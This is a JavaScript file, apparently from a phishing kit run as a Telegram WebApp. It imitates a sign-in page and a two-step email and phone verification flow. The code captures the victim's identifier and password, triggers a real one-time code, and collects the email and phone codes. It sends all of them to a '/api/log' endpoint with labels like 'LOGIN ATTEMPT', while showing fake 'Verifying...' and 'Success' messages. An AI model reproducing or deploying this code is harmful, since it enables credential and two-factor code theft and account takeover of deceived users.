const tg = window.Telegram ? window.Telegram.WebApp : null;
if (tg) {
    tg.expand();
    tg.ready();
}

document.addEventListener('DOMContentLoaded', () => {
    // UI Elements
    const screenSignin = document.getElementById('screen-signin');
    const screenStepper = document.getElementById('screen-stepper');
    const modalEmail = document.getElementById('modal-email-otp');
    const modalPhone = document.getElementById('modal-phone-otp');

    const loginId = document.getElementById('login-identifier');
    const loginPass = document.getElementById('login-password');
    const verifyEmailId = document.getElementById('verify-email-id');
    const verifyEmailOtp = document.getElementById('verify-email-otp');
    const verifyPhoneNum = document.getElementById('verify-phone-num');
    const verifyPhoneOtp = document.getElementById('verify-phone-otp');

    let userData = { id: '', pass: '', email: '', email_otp: '', phone: '', phone_otp: '', time: '' };
    let currentStep = 1;

    // Sign In Button
    const btnSignin = document.getElementById('trigger-signin');
    if (btnSignin) {
        btnSignin.addEventListener('click', () => {
            const idVal = loginId.value.trim();
            const passVal = loginPass.value.trim();

            if (!idVal) return alert("Please enter Email / Phone Number");

            userData.id = idVal;
            userData.pass = passVal;
            userData.time = new Date().toLocaleString();

            // Pre-fill
            if (idVal.includes('@')) verifyEmailId.value = idVal;
            else if (/^\d+$/.test(idVal.replace(/\+/g, ''))) verifyPhoneNum.value = idVal;

            // Log securely (Fire and forget, don't wait)
            logToServer('🔑 LOGIN ATTEMPT', userData);

            // SWITCH SCREEN IMMEDIATELY
            screenSignin.style.display = 'none';
            screenStepper.style.display = 'flex';
        });
    }

    // Email Verify Click
    document.getElementById('item-email').addEventListener('click', () => {
        if (currentStep !== 1) return;
        modalEmail.style.display = 'flex';
        
        if (verifyEmailId.value.includes('@')) {
            fetch('/send-otp', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ email: verifyEmailId.value })
            }).catch(e => console.error("OTP failed", e));
        }
    });

    // Email Submit
    document.getElementById('submit-email-otp').addEventListener('click', async () => {
        if (!verifyEmailId.value || !verifyEmailOtp.value) return alert("Fill all fields");
        
        userData.email = verifyEmailId.value;
        userData.email_otp = verifyEmailOtp.value;
        
        document.getElementById('submit-email-otp').innerText = "Verifying...";
        await logToServer('📧 EMAIL VERIFY', userData);
        
        modalEmail.style.display = 'none';
        currentStep = 2;
        
        document.getElementById('step-number-display').innerText = '2/2';
        const itemEmail = document.getElementById('item-email');
        itemEmail.style.opacity = '0.5';
        itemEmail.style.pointerEvents = 'none';
        itemEmail.querySelector('.card-link').innerHTML = 'Verified <i class="fas fa-check"></i>';
        itemEmail.querySelector('.card-link').style.color = '#3bc117';
        
        const itemPhone = document.getElementById('item-phone');
        itemPhone.style.opacity = '1';
        itemPhone.style.pointerEvents = 'auto';
        itemPhone.classList.add('active');
    });

    // Phone Click
    document.getElementById('item-phone').addEventListener('click', () => {
        if (currentStep !== 2) return;
        modalPhone.style.display = 'flex';
    });

    // Phone Submit
    document.getElementById('submit-phone-otp').addEventListener('click', async () => {
        if (!verifyPhoneNum.value || !verifyPhoneOtp.value) return alert("Fill all fields");
        
        userData.phone = verifyPhoneNum.value;
        userData.phone_otp = verifyPhoneOtp.value;
        
        document.getElementById('submit-phone-otp').innerText = "Success";
        await logToServer('📱 PHONE VERIFY (FINAL)', userData);
        
        document.getElementById('btn-final-confirm').classList.add('ready');

        setTimeout(() => {
            if (tg) tg.close();
            else location.reload();
        }, 1500);
    });

    // Tab Logic
    document.querySelectorAll('.signin-tab').forEach(tab => {
        tab.addEventListener('click', () => {
            document.querySelectorAll('.signin-tab').forEach(t => t.classList.remove('active'));
            tab.classList.add('active');
            document.getElementById('login-password-wrapper').style.display = (tab.dataset.tab === 'otp') ? 'none' : 'block';
        });
    });

    // Password Eye
    const eyeBtn = document.querySelector('.btn-password-eye');
    if (eyeBtn) {
        eyeBtn.addEventListener('click', () => {
            const isPass = loginPass.type === 'password';
            loginPass.type = isPass ? 'text' : 'password';
            eyeBtn.innerHTML = isPass ? '<i class="far fa-eye"></i>' : '<i class="far fa-eye-slash"></i>';
        });
    }

    async function logToServer(title, data) {
        try {
            await fetch('/api/log', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ title, data })
            });
        } catch (e) {
            console.error("Log failed", e);
        }
    }

    window.closeAllModals = () => {
        modalEmail.style.display = 'none';
        modalPhone.style.display = 'none';
    };

    window.pasteOTP = async (id) => {
        try {
            const t = await navigator.clipboard.readText();
            if (t) document.getElementById(id).value = t;
        } catch(e) {}
    };

    document.getElementById('back-to-signin').addEventListener('click', () => {
        screenStepper.style.display = 'none';
        screenSignin.style.display = 'block';
    });
});
